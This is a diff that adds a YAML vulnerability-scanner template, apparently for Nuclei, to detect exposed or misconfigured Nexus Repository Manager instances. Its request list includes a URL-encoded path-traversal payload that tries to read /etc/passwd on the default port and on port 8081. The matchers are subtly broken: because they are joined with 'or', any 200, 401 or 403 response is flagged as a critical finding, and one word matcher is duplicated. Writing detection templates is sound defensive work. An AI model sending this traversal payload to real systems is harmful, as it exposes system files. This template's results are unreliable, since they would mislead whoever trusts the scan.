@@ -1,0 +1,47 @@
+id: nexus-misconfig
+info:
+  name: Nexus Repository Manager Misconfiguration Detection
+  author: pwn
+  severity: critical
+  description: Detects exposed Nexus Repository Manager instances with accessible sensitive endpoints or vulnerable to path traversal, potentially leading to system file exposure.
+  tags: nexus, misconfiguration, path-traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/service/extdirect"
+      - "{{BaseURL}}/service/rest/beta/repositories/go/group"
+      - "{{BaseURL}}/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+      - "{{BaseURL}}:8081/service/extdirect"
+      - "{{BaseURL}}:8081/service/rest/beta/repositories/go/group"
+      - "{{BaseURL}}:8081/%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Nexus"
+          - "Sonatype"
+          - "passwd"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: word
+        words:
+          - "Nexus"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: status
+        status:
+          - 403
+          - 401
+    extractors:
+      - type: regex
+        name: matched_path
+        part: request
+        regex:
+          - "https?://[^/]+(/.*)"
+        group: 1
